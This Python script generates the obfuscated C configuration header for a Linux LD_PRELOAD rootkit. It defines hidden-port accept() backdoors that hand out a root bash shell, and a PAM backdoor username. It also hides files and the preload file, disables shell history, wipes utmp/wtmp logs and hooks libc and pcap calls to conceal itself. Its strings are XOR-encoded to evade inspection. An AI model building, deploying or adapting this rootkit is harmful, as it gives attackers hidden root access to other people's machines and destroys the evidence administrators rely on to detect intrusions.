#!/usr/bin/env python

def xor(x_str):
	return ''.join(list('\\x'+hex(ord(x) ^ 0xfe)[2:] for x in x_str))

# Change everything in this box
#-----------------------------------------------------------------------
LOW_PORT = "61040"                    # Lowest source port for plain text backdoor
HIGH_PORT = "61050"                   # Highest source port for plain text backdoor
CRYPT_LOW = "61051"                   # Lowest source port for crypthook backdoor
CRYPT_HIGH = "61060"                  # Highest source port for crypthook backdoor
PAM_PORT = "61061"					  # Also hide this port, but don't trigger accept backdoors
MAGIC_STRING = "__"                   # Hide files with this string in the name

BLIND_LOGIN = "rootme"                # Username for ssh / su PAM backdoor.
C_ROOT = "root"                       # Give accept() users these privs
SHELL_MSG = "Welcome!\nHere's a shell: " # Welcome msg for remote user
SHELL_PASSWD = "changeme"             # Remote password for accept backdoors
SHELL_TYPE = "/bin/bash"              # Execute this as the shell

ANTI_DEBUG_MSG = "Don't scratch the walls"
CLEANUP_LOGS = "CLEANUP_LOGS"

# Crypthook key constants
PASSPHRASE = "Hello NSA"              # This is the crypto key. CHANGE THIS.
KEY_SALT = "changeme"                 # Used in key derivation. CHANGE THIS.
#-----------------------------------------------------------------------

print '''
#define _GNU_SOURCE
#ifndef CONST_H
#define CONST_H
//#define DEBUG_APP 
#ifdef DEBUG_APP
#define DEBUG(...) fprintf(stderr, __VA_ARGS__);
#else
#define DEBUG(...)
#endif

#define LOW_PORT	''' + LOW_PORT + '''
#define HIGH_PORT	''' + HIGH_PORT + '''
#define CRYPT_LOW	''' + CRYPT_LOW + '''
#define CRYPT_HIGH	''' + CRYPT_HIGH + '''
#define PAM_PORT ''' + PAM_PORT + '''
#define MAGIC_STRING	"''' + MAGIC_STRING + '''"
#define BLIND_LOGIN "''' + xor(BLIND_LOGIN) + '''"
#define C_ROOT "''' + xor(C_ROOT) + '''"
#define SHELL_MSG "''' + xor(SHELL_MSG) + '''"
#define SHELL_PASSWD "''' + xor(SHELL_PASSWD) + '''"
#define SHELL_TYPE "''' + xor(SHELL_TYPE) + '''"
#define PASSPHRASE "''' + xor(PASSPHRASE) + '''"
#define KEY_SALT "''' + xor(KEY_SALT) + '''"
#define ANTI_DEBUG_MSG "''' + xor(ANTI_DEBUG_MSG) + '''"
#define CLEANUP_LOGS "''' + xor(CLEANUP_LOGS) + '''"
#define SYS_ACCEPT 0
#define SYS_ACCESS 1
#define SYS_EXECVE 2
#define SYS_LINK 3
#define SYS_LXSTAT 4
#define SYS_LXSTAT64 5
#define SYS_OPEN 6
#define SYS_RMDIR 7
#define SYS_UNLINK 8
#define SYS_UNLINKAT 9
#define SYS_XSTAT 10
#define SYS_XSTAT64 11
#define SYS_FOPEN 12
#define SYS_FOPEN64 13
#define SYS_OPENDIR 14
#define SYS_READDIR 15
#define SYS_READDIR64 16
#define SYS_PAM_AUTHENTICATE 17
#define SYS_PAM_OPEN_SESSION 18
#define SYS_PAM_ACCT_MGMT 19
#define SYS_GETPWNAM 20
#define SYS_PAM_SM_AUTHENTICATE 21
#define SYS_GETPWNAM_R 22
#define SYS_PCAP_LOOP 23
#define SYSCALL_SIZE 24

#define LD_NORMAL "''' + xor("/etc/ld.so.preload") + '''"
#define LD_HIDE "''' + xor("/etc/.ld.so.preload") + '''"
#define SYS_WRITE "''' + xor("write") + '''"
#define SYS_READ "''' + xor("read") + '''"
#define HIST_FILE "'''+ xor("HISTFILE=/dev/null") + '''"
#define C_UNHIDE "''' + xor("bin/unhide") + '''"
#define C_LDD "''' + xor("bin/ldd") + '''"
#define PROC_NET_TCP "''' + xor("/proc/net/tcp") + '''"
#define PROC_NET_TCP6 "''' + xor("/proc/net/tcp6") + '''"
#define CONFIG_FILE "''' + xor("ld.so.preload") + '''"
#define PROC_PATH "''' + xor("/proc/") + '''"
#define CMD_LINE  "''' + xor("%s/cmdline") + '''"
#define ENV_LINE "''' + xor("%s/environ") + '''"
#define PROC_STR  "''' + xor("/proc/%s") + '''"
#define SCANF_LINE "''' + xor("%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n") + '''"

#define LD_TRACE "''' + xor("LD_TRACE_LOADED_OBJECTS") + '''"
#define LD_LINUX "''' + xor("ld-linux") + '''"

#define UTMP_MSG "''' + xor("utmp logs cleaned up.") + '''"
#define WTMP_MSG "''' + xor("wtmp logs cleaned up.") + '''"

#define UTMP_FILE_X "''' + xor("/var/run/utmp") + '''"
#define WTMP_FILE_X "''' + xor("/var/log/wtmp") + '''"

#define HISTFILE "''' + xor("HISTFILE") + '''"
#define TERM "''' + xor("TERM=xterm") + '''"
#define HIDE_TERM_VAR "''' + xor("HIDE_THIS_SHELL=please") + '''"
#define HIDE_TERM_STR "''' + xor("HIDE_THIS_SHELL") + '''"
static char *syscall_table[SYSCALL_SIZE] = {'''

syscalls = ["accept", "access", "execve", "link", "__lxstat", "__lxstat64", 
   "open", "rmdir", "unlink", "unlinkat", "__xstat", "__xstat64",
   "fopen", "fopen64", "opendir", "readdir", "readdir64",
   "pam_authenticate", "pam_open_session", "pam_acct_mgmt",
   "getpwnam", "pam_sm_authenticate", "getpwnam_r", "pcap_loop"]

call_str = ''
for call in syscalls:
	if call != syscalls[-1]:
		call_str = call_str + ' "' + xor(call) + '",'
	else:
		call_str = call_str + ' "' + xor(call) + '"'
		
print call_str + '''};
#endif'''
